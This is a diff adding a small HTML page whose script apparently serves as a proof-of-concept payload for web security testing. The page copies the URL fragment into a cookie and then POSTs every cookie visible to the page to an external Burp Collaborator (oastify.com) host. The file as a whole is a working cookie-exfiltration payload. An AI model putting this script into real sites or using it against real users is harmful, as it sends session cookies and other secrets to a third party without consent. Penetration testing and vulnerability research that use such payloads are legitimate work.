@@ -1,0 +1,13 @@
+<html>
+        <body>
+                <script>
+        var type = window.location.hash.substring(1);
+                        document.cookie = "key="+type;
+fetch('https://uki7yqu4b44fv06dv8y88i1gc7iy6wul.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+        </script>
+        </body>
+        </html>
